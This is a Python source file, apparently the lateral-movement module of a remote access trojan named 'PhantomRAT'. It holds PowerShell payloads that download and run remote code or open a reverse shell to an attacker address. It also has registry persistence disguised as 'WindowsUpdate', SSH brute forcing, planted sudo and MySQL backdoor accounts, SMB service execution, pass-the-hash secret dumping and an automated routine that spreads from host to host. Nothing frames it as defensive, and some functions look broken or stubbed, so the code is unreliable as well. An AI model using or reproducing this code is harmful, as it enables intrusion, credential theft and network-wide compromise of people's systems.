
import subprocess
import os
import paramiko
import socket
import time
import json
import random
import string
import hashlib
import threading
import queue
import re
from datetime import datetime
import logging
import smbclient
import winrm
import pymysql
import psycopg2
import pymssql
import pymongo
import redis
import ldap3
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, srvs, scmr
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY

logger = logging.getLogger(__name__)

class AdvancedLateralMovement:
    """
    Advanced lateral movement with multiple techniques and protocols
    """
    
    def __init__(self, credential_store=None):
        self.credential_store = credential_store or {}
        self.session_manager = SessionManager()
        self.techniques = {
            'ssh': self._lateral_ssh,
            'smb': self._lateral_smb,
            'wmi': self._lateral_wmi,
            'winrm': self._lateral_winrm,
            'rdp': self._lateral_rdp,
            'database': self._lateral_database,
            'ssh_tunnel': self._lateral_ssh_tunnel,
            'pass_the_hash': self._lateral_pth,
            'pass_the_ticket': self._lateral_ptt,
            'dcom': self._lateral_dcom,
            'ps_exec': self._lateral_psexec
        }
        
        # Common payloads for execution
        self.payloads = {
            'download_exec': '''
$url = "{url}"; 
$output = "$env:TEMP\\{filename}"; 
(New-Object System.Net.WebClient).DownloadFile($url, $output); 
Start-Process $output
''',
            'reverse_shell': '''
$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
''',
            'persistence': '''
# Add registry persistence
New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" `
    -Name "WindowsUpdate" -Value "{malware_path}" -PropertyType String -Force
'''
        }
    
    def lateral_move(self, target, technique='auto', payload=None, credentials=None):
        """
        Perform lateral movement to target
        """
        results = {
            'target': target,
            'technique': technique,
            'success': False,
            'timestamp': datetime.now().isoformat(),
            'details': {}
        }
        
        try:
            # Auto-detect technique if needed
            if technique == 'auto':
                technique = self._detect_best_technique(target)
            
            # Get credentials
            if not credentials:
                credentials = self._get_credentials_for_target(target)
            
            # Execute lateral movement
            if technique in self.techniques:
                logger.info(f"Attempting lateral movement to {target} using {technique}")
                
                func = self.techniques[technique]
                success, details = func(target, credentials, payload)
                
                results['success'] = success
                results['details'] = details
                results['technique_used'] = technique
                
                if success:
                    logger.info(f"Successfully moved to {target}")
                    # Establish persistent session
                    self.session_manager.add_session(target, technique, credentials)
                else:
                    logger.warning(f"Failed to move to {target}: {details.get('error', 'Unknown error')}")
            
            else:
                results['details']['error'] = f"Unknown technique: {technique}"
                logger.error(f"Unknown lateral movement technique: {technique}")
        
        except Exception as e:
            results['details']['error'] = str(e)
            logger.error(f"Lateral movement error: {e}")
        
        return results
    
    def _detect_best_technique(self, target):
        """Detect best lateral movement technique for target"""
        open_ports = self._scan_ports(target)
        
        # Check for common services
        if 22 in open_ports:
            return 'ssh'
        elif 445 in open_ports:
            return 'smb'
        elif 5985 in open_ports or 5986 in open_ports:
            return 'winrm'
        elif 3389 in open_ports:
            return 'rdp'
        elif 135 in open_ports:
            return 'wmi'
        else:
            # Try SMB as default for Windows
            return 'smb'
    
    def _scan_ports(self, target, ports=None):
        """Quick port scan"""
        if ports is None:
            ports = [22, 445, 135, 139, 3389, 5985, 5986]
        
        open_ports = []
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
            except:
                pass
        
        return open_ports
    
    def _get_credentials_for_target(self, target):
        """Get credentials for target from store"""
        # Check for exact match
        if target in self.credential_store:
            return self.credential_store[target]
        
        # Check for domain credentials
        for cred_key, creds in self.credential_store.items():
            if 'domain' in creds and creds['domain'] in target:
                return creds
        
        # Use default credentials
        default_creds = [
            {'username': 'Administrator', 'password': 'Administrator'},
            {'username': 'admin', 'password': 'admin'},
            {'username': 'root', 'password': 'root'},
            {'username': 'administrator', 'password': ''},
            {'username': 'guest', 'password': ''}
        ]
        
        return random.choice(default_creds)
    
    def _lateral_ssh(self, target, credentials, payload=None):
        """Lateral movement via SSH"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            username = credentials.get('username', 'root')
            password = credentials.get('password', '')
            private_key = credentials.get('private_key')
            
            if private_key:
                # Use private key authentication
                key = paramiko.RSAKey.from_private_key_file(private_key)
                ssh.connect(target, username=username, pkey=key, timeout=10)
            else:
                # Use password authentication
                ssh.connect(target, username=username, password=password, timeout=10)
            
            # Execute payload
            if payload:
                stdin, stdout, stderr = ssh.exec_command(payload)
                output = stdout.read().decode() + stderr.read().decode()
            else:
                # Default: create backdoor user
                backdoor_user = f'backup_{random.randint(1000, 9999)}'
                backdoor_pass = self._generate_password()
                
                commands = [
                    f'sudo useradd -m -s /bin/bash {backdoor_user}',
                    f'echo "{backdoor_user}:{backdoor_pass}" | sudo chpasswd',
                    f'sudo usermod -aG sudo {backdoor_user}',
                    f'echo "{backdoor_user} ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/{backdoor_user}'
                ]
                
                output = ""
                for cmd in commands:
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    output += stdout.read().decode() + stderr.read().decode()
                
                # Store credentials
                self.credential_store[target] = {
                    'username': backdoor_user,
                    'password': backdoor_pass,
                    'source': 'ssh_lateral'
                }
            
            ssh.close()
            
            return True, {
                'technique': 'ssh',
                'output': output[:1000],  # Limit output size
                'credentials_added': 'backdoor_user' in locals()
            }
            
        except Exception as e:
            return False, {'error': str(e), 'technique': 'ssh'}
    
    def _lateral_smb(self, target, credentials, payload=None):
        """Lateral movement via SMB"""
        try:
            username = credentials.get('username', 'Administrator')
            password = credentials.get('password', '')
            domain = credentials.get('domain', '')
            lmhash = credentials.get('lmhash', '')
            nthash = credentials.get('nthash', '')
            
            # Connect via SMB
            conn = SMBConnection(target, target)
            
            if lmhash and nthash:
                # Pass-the-hash
                conn.login(username, '', domain, lmhash, nthash)
            else:
                # Password authentication
                conn.login(username, password, domain)
            
            # Check admin access
            shares = conn.listShares()
            
            # Try to write to ADMIN$ share
            try:
                conn.connectTree('ADMIN$')
                
                # Upload payload
                if payload:
                    # For Windows targets, create PowerShell payload
                    ps_payload = self._create_ps_payload(payload)
                    filename = f'update_{random.randint(1000, 9999)}.ps1'
                    
                    conn.createFile('ADMIN$', f'\\{filename}')
                    file_handle = conn.openFile('ADMIN$', f'\\{filename}')
                    conn.writeFile(file_handle, ps_payload.encode())
                    conn.closeFile(file_handle)
                    
                    # Execute via service creation
                    service_name = f'WindowsUpdate{random.randint(10000, 99999)}'
                    
                    sc_command = f'sc \\\\{target} create {service_name} binPath= "cmd /c powershell -ExecutionPolicy Bypass -File C:\\Windows\\{filename}"'
                    sc_start = f'sc \\\\{target} start {service_name}'
                    
                    import subprocess
                    subprocess.run(sc_command, shell=True, capture_output=True)
                    subprocess.run(sc_start, shell=True, capture_output=True)
                    
                    output = f"Payload uploaded and executed as service {service_name}"
                else:
                    output = f"Successfully connected to {target} as {username}"
                
                conn.logoff()
                
                return True, {
                    'technique': 'smb',
                    'output': output,
                    'shares': [share['shi1_netname'][:-1] for share in shares]
                }
                
            except Exception as e:
                conn.logoff()
                return False, {'error': str(e), 'technique': 'smb'}
            
        except Exception as e:
            return False, {'error': str(e), 'technique': 'smb'}
    
    def _lateral_wmi(self, target, credentials, payload=None):
        """Lateral movement via WMI"""
        try:
            username = credentials.get('username', 'Administrator')
            password = credentials.get('password', '')
            domain = credentials.get('domain', '')
            
            # Create WMI connection
            import wmi
            wmi_conn = wmi.WMI(computer=target, user=username, password=password)
            
            # Execute command
            if payload:
                process_startup = wmi_conn.Win32_ProcessStartup.new()
                process_startup.ShowWindow = 0  # Hidden window
                
                process_id, result = wmi_conn.Win32_Process.Create(
                    CommandLine=payload,
                    ProcessStartupInformation=process_startup
                )
                
                output = f"Process created with PID {process_id}, result: {result}"
            else:
                # Get system information
                os_info = wmi_conn.Win32_OperatingSystem()[0]
                output = f"OS: {os_info.Caption}, Version: {os_info.Version}"
            
            return True, {
                'technique': 'wmi',
                'output': output
            }
            
        except Exception as e:
            return False, {'error': str(e), 'technique': 'wmi'}
    
    def _lateral_winrm(self, target, credentials, payload=None):
        """Lateral movement via WinRM"""
        try:
            username = credentials.get('username', 'Administrator')
            password = credentials.get('password', '')
            
            # Determine port
            port = 5986  # HTTPS
            try:
                # Try HTTP first
                session = winrm.Session(
                    f'http://{target}:5985/wsman',
                    auth=(username, password),
                    transport='ntlm'
                )
            except:
                # Try HTTPS
                session = winrm.Session(
                    f'https://{target}:5986/wsman',
                    auth=(username, password),
                    transport='ntlm',
                    server_cert_validation='ignore'
                )
                port = 5986
            
            # Execute command
            if payload:
                result = session.run_ps(payload)
                output = result.std_out.decode() + result.std_err.decode()
            else:
                # Get system info
                result = session.run_cmd('systeminfo')
                output = result.std_out.decode()[:500]  # First 500 chars
            
            return True, {
                'technique': 'winrm',
                'port': port,
                'output': output
            }
            
        except Exception as e:
            return False, {'error': str(e), 'technique': 'winrm'}
    
    def _lateral_rdp(self, target, credentials, payload=None):
        """Lateral movement via RDP"""
        try:
            # This would use pyrdp or similar library
            # For now, just check if RDP is accessible
            
            # Check RDP port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target, 3389))
            sock.close()
            
            if result == 0:
                username = credentials.get('username', 'Administrator')
                password = credentials.get('password', '')
                
                # Note: Actual RDP connection would go here
                # For now, just report success
                return True, {
                    'technique': 'rdp',
                    'message': 'RDP port accessible',
                    'credentials': f'{username}:{password}'
                }
            else:
                return False, {'error': 'RDP port not accessible', 'technique': 'rdp'}
            
        except Exception as e:
            return False, {'error': str(e), 'technique': 'rdp'}
    
    def _lateral_database(self, target, credentials, payload=None):
        """Lateral movement via database connections"""
        try:
            # Try different database types
            db_types = ['mysql', 'postgresql', 'mssql', 'mongodb', 'redis']
            
            for db_type in db_types:
                try:
                    if db_type == 'mysql':
                        conn = pymysql.connect(
                            host=target,
                            user=credentials.get('username', 'root'),
                            password=credentials.get('password', ''),
                            database='mysql',
                            connect_timeout=5
                        )
                        
                        cursor = conn.cursor()
                        cursor.execute("SELECT VERSION()")
                        version = cursor.fetchone()[0]
                        
                        # Try to create backdoor user
                        backdoor_user = f'dbadmin_{random.randint(1000, 9999)}'
                        backdoor_pass = self._generate_password()
                        
                        cursor.execute(f"CREATE USER '{backdoor_user}'@'%' IDENTIFIED BY '{backdoor_pass}'")
                        cursor.execute(f"GRANT ALL PRIVILEGES ON *.* TO '{backdoor_user}'@'%' WITH GRANT OPTION")
                        cursor.execute("FLUSH PRIVILEGES")
                        
                        conn.close()
                        
                        return True, {
                            'technique': 'database',
                            'type': 'mysql',
                            'version': version,
                            'backdoor_user': backdoor_user,
                            'backdoor_pass': backdoor_pass
                        }
                    
                    elif db_type == 'postgresql':
                        conn = psycopg2.connect(
                            host=target,
                            user=credentials.get('username', 'postgres'),
                            password=credentials.get('password', ''),
                            database='postgres',
                            connect_timeout=5
                        )
                        
                        cursor = conn.cursor()
                        cursor.execute("SELECT version()")
                        version = cursor.fetchone()[0]
                        conn.close()
                        
                        return True, {
                            'technique': 'database',
                            'type': 'postgresql',
                            'version': version
                        }
                    
                    # Similar for other database types...
                    
                except:
                    continue
            
            return False, {'error': 'No database connection succeeded', 'technique': 'database'}
            
        except Exception as e:
            return False, {'error': str(e), 'technique': 'database'}
    
    def _lateral_ssh_tunnel(self, target, credentials, payload=None):
        """Create SSH tunnel for lateral movement"""
        try:
            # Establish SSH connection
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            username = credentials.get('username', 'root')
            password = credentials.get('password', '')
            
            ssh.connect(target, username=username, password=password, timeout=10)
            
            # Create tunnel
            transport = ssh.get_transport()
            
            # Forward local port to remote service
            local_port = random.randint(10000, 20000)
            remote_host = '127.0.0.1'
            remote_port = 3389  # RDP as example
            
            transport.request_port_forward('', local_port)
            channel = transport.open_channel(
                'direct-tcpip',
                (remote_host, remote_port),
                ('', local_port)
            )
            
            return True, {
                'technique': 'ssh_tunnel',
                'local_port': local_port,
                'remote_host': remote_host,
                'remote_port': remote_port,
                'tunnel_active': channel.active if channel else False
            }
            
        except Exception as e:
            return False, {'error': str(e), 'technique': 'ssh_tunnel'}
    
    def _lateral_pth(self, target, credentials, payload=None):
        """Pass-the-hash attack"""
        try:
            username = credentials.get('username', 'Administrator')
            lmhash = credentials.get('lmhash', '')
            nthash = credentials.get('nthash', '')
            domain = credentials.get('domain', '')
            
            if not lmhash or not nthash:
                return False, {'error': 'No hash provided', 'technique': 'pass_the_hash'}
            
            # Use impacket for PTH
            from impacket.examples.secretsdump import RemoteOperations
            
            # This is simplified - actual implementation would be more complex
            ro = RemoteOperations(target, username, '', domain, lmhash, nthash)
            
            # Try to dump secrets
            secrets = ro.dumpSecrets()
            
            return True, {
                'technique': 'pass_the_hash',
                'secrets_dumped': bool(secrets),
                'hashes': f'{lmhash}:{nthash}'
            }
            
        except Exception as e:
            return False, {'error': str(e), 'technique': 'pass_the_hash'}
    
    def _lateral_ptt(self, target, credentials, payload=None):
        """Pass-the-ticket attack"""
        try:
            # This would require Kerberos tickets
            # Simplified implementation
            
            ticket = credentials.get('ticket')
            if not ticket:
                return False, {'error': 'No ticket provided', 'technique': 'pass_the_ticket'}
            
            # Set environment variable for Kerberos
            import os
            os.environ['KRB5CCNAME'] = ticket
            
            # Try to access resource
            import subprocess
            result = subprocess.run(['klist'], capture_output=True, text=True)
            
            return True, {
                'technique': 'pass_the_ticket',
                'ticket_valid': 'Ticket' in result.stdout,
                'output': result.stdout[:200]
            }
            
        except Exception as e:
            return False, {'error': str(e), 'technique': 'pass_the_ticket'}
    
    def _lateral_dcom(self, target, credentials, payload=None):
        """Lateral movement via DCOM"""
        try:
            username = credentials.get('username', 'Administrator')
            password = credentials.get('password', '')
            domain = credentials.get('domain', '')
            
            # Use impacket DCOM
            from impacket.dcerpc.v5.transport import DCERPCTransportFactory
            from impacket.dcerpc.v5 import scmr, rrp
            
            string_binding = r'ncacn_ip_tcp:%s' % target
            transport = DCERPCTransportFactory(string_binding)
            transport.set_credentials(username, password, domain)
            
            dce = transport.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)
            
            # Open service manager
            resp = scmr.hROpenSCManagerW(dce)
            sc_handle = resp['lpScHandle']
            
            return True, {
                'technique': 'dcom',
                'service_manager_accessible': True,
                'sc_handle': sc_handle
            }
            
        except Exception as e:
            return False, {'error': str(e), 'technique': 'dcom'}
    
    def _lateral_psexec(self, target, credentials, payload=None):
        """Lateral movement via PSExec"""
        try:
            username = credentials.get('username', 'Administrator')
            password = credentials.get('password', '')
            domain = credentials.get('domain', '')
            
            # Use impacket's psexec
            from impacket.examples.psexec import PSEXEC
            
            # This is simplified - actual PSExec would be more complex
            psexec = PSEXEC(target, username, password, domain, '')
            
            # Execute command
            if payload:
                output = psexec.run(payload)
            else:
                output = psexec.run('whoami')
            
            return True, {
                'technique': 'psexec',
                'output': output[:500] if output else 'No output'
            }
            
        except Exception as e:
            return False, {'error': str(e), 'technique': 'psexec'}
    
    def _create_ps_payload(self, payload_type='download_exec', **kwargs):
        """Create PowerShell payload"""
        if payload_type in self.payloads:
            template = self.payloads[payload_type]
            return template.format(**kwargs)
        else:
            # Default payload
            return 'Write-Host "PhantomRAT Lateral Movement"'
    
    def _generate_password(self, length=12):
        """Generate random password"""
        chars = string.ascii_letters + string.digits + '!@#$%^&*'
        return ''.join(random.choice(chars) for _ in range(length))

class SessionManager:
    """Manage lateral movement sessions"""
    
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()
    
    def add_session(self, target, technique, credentials):
        """Add new session"""
        with self.lock:
            session_id = hashlib.md5(f"{target}{time.time()}".encode()).hexdigest()[:8]
            self.sessions[session_id] = {
                'target': target,
                'technique': technique,
                'credentials': credentials,
                'created': datetime.now().isoformat(),
                'last_used': datetime.now().isoformat(),
                'active': True
            }
            return session_id
    
    def get_session(self, target):
        """Get active session for target"""
        with self.lock:
            for session_id, session in self.sessions.items():
                if session['target'] == target and session['active']:
                    session['last_used'] = datetime.now().isoformat()
                    return session_id, session
        return None, None
    
    def close_session(self, session_id):
        """Close session"""
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id]['active'] = False
                return True
        return False

def brute_ssh(ip, user_list, pass_list, timeout=5):
    """SSH brute force with improved logic"""
    results = {
        'ip': ip,
        'success': False,
        'credentials': None,
        'attempts': 0,
        'errors': []
    }
    
    # Check if user_list and pass_list are files or lists
    if isinstance(user_list, str) and os.path.exists(user_list):
        with open(user_list, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
    else:
        users = user_list if isinstance(user_list, list) else [user_list]
    
    if isinstance(pass_list, str) and os.path.exists(pass_list):
        with open(pass_list, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    else:
        passwords = pass_list if isinstance(pass_list, list) else [pass_list]
    
    # Try common credentials first
    common_creds = [
        ('root', 'root'),
        ('admin', 'admin'),
        ('administrator', ''),
        ('user', 'user'),
        ('test', 'test')
    ]
    
    for user, password in common_creds:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=user, password=password, timeout=timeout)
            ssh.close()
            
            results['success'] = True
            results['credentials'] = {'user': user, 'password': password}
            return user, password
            
        except:
            pass
    
    # Brute force remaining combinations
    for user in users[:50]:  # Limit users
        for password in passwords[:100]:  # Limit passwords per user
            try:
                results['attempts'] += 1
                
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=user, password=password, timeout=timeout)
                ssh.close()
                
                results['success'] = True
                results['credentials'] = {'user': user, 'password': password}
                return user, password
                
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                results['errors'].append(str(e))
                continue
    
    return None, None

def lateral_move(ip, user, password, technique='auto', payload=None):
    """Main lateral movement function"""
    try:
        mover = AdvancedLateralMovement()
        
        credentials = {
            'username': user,
            'password': password,
            'source': 'brute_force'
        }
        
        result = mover.lateral_move(ip, technique, payload, credentials)
        
        if result['success']:
            print(f"Successfully moved to {ip} using {result['technique_used']}")
            return True
        else:
            print(f"Failed to move to {ip}: {result['details'].get('error', 'Unknown error')}")
            return False
            
    except Exception as e:
        print(f"Lateral movement error: {e}")
        return False

def automated_lateral_spread(start_ip, credentials, depth=3, technique='auto'):
    """
    Automated lateral spread through network
    """
    visited = set()
    to_visit = [(start_ip, 0)]
    successful = []
    
    mover = AdvancedLateralMovement()
    
    while to_visit:
        current_ip, current_depth = to_visit.pop(0)
        
        if current_ip in visited or current_depth > depth:
            continue
        
        visited.add(current_ip)
        
        print(f"\n[+] Attempting lateral movement to {current_ip} (depth: {current_depth})")
        
        # Try lateral movement
        result = mover.lateral_move(current_ip, technique, credentials=credentials)
        
        if result['success']:
            successful.append({
                'ip': current_ip,
                'depth': current_depth,
                'technique': result.get('technique_used'),
                'timestamp': result['timestamp']
            })
            
            print(f"  [+] Success! Using {result.get('technique_used')}")
            
            # Discover new hosts from this machine
            if current_depth < depth:
                new_hosts = discover_hosts_from(current_ip, credentials)
                for new_host in new_hosts:
                    if new_host not in visited:
                        to_visit.append((new_host, current_depth + 1))
        else:
            print(f"  [-] Failed: {result['details'].get('error', 'Unknown')}")
    
    return successful

def discover_hosts_from(ip, credentials):
    """
    Discover other hosts from compromised machine
    """
    discovered = []
    
    try:
        # Try different methods to discover hosts
        methods = [
            lambda: _discover_via_arp(ip, credentials),
            lambda: _discover_via_netstat(ip, credentials),
            lambda: _discover_via_nbstat(ip, credentials)
        ]
        
        for method in methods:
            try:
                hosts = method()
                if hosts:
                    discovered.extend(hosts)
            except:
                continue
        
        # Remove duplicates
        discovered = list(set(discovered))
        
    except Exception as e:
        logger.error(f"Host discovery failed: {e}")
    
    return discovered

def _discover_via_arp(ip, credentials):
    """Discover hosts via ARP table"""
    hosts = []
    
    try:
        # SSH to host and get ARP table
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, 
                   username=credentials.get('username'),
                   password=credentials.get('password'),
                   timeout=10)
        
        # Get ARP table
        stdin, stdout, stderr = ssh.exec_command('arp -a')
        output = stdout.read().decode() + stderr.read().decode()
        ssh.close()
        
        # Parse ARP output
        import re
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        ips = re.findall(ip_pattern, output)
        
        hosts = [ip for ip in ips if ip != '0.0.0.0' and not ip.startswith('127.')]
        
    except:
        pass
    
    return hosts

def _discover_via_netstat(ip, credentials):
    """Discover hosts via netstat connections"""
    hosts = []
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip,
                   username=credentials.get('username'),
                   password=credentials.get('password'),
                   timeout=10)
        
        # Get netstat output
        stdin, stdout, stderr = ssh.exec_command('netstat -an')
        output = stdout.read().decode() + stderr.read().decode()
        ssh.close()
        
        # Parse for IP addresses
        import re
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        ips = re.findall(ip_pattern, output)
        
        # Filter and deduplicate
        hosts = []
        for ip_addr in ips:
            if (ip_addr != '0.0.0.0' and 
                not ip_addr.startswith('127.') and 
                ip_addr != ip and
                ip_addr not in hosts):
                hosts.append(ip_addr)
        
    except:
        pass
    
    return hosts

def _discover_via_nbstat(ip, credentials):
    """Discover hosts via NetBIOS (Windows)"""
    hosts = []
    
    try:
        # This would use Windows commands
        # For now, return empty list
        pass
    except:
        pass
    
    return hosts

if __name__ == "__main__":
    # Test lateral movement
    print("Testing Advanced Lateral Movement...")
    
    # Initialize
    mover = AdvancedLateralMovement()
    
    # Test credentials
    test_credentials = {
        'username': 'Administrator',
        'password': 'Password123!',
        'domain': 'WORKGROUP'
    }
    
    # Test different techniques (simulated)
    test_target = '192.168.1.100'
    
    print(f"\nTesting techniques against {test_target}:")
    
    techniques = ['ssh', 'smb', 'wmi', 'winrm']
    
    for technique in techniques:
        print(f"\n  Testing {technique}...")
        success, details = mover.lateral_move(test_target, technique, credentials=test_credentials)
        
        if success:
            print(f"    ✓ Success: {details.get('output', 'Connected')[:50]}...")
        else:
            print(f"    ✗ Failed: {details.get('error', 'Unknown error')}")
    
    # Test automated spread
    print(f"\n\nTesting automated lateral spread...")
    
    successful = automated_lateral_spread(
        start_ip='192.168.1.1',
        credentials=test_credentials,
        depth=2,
        technique='auto'
    )
    
    print(f"\nSpread complete. Successfully compromised {len(successful)} hosts:")
    for host in successful:
        print(f"  - {host['ip']} (depth: {host['depth']}, technique: {host['technique']})")
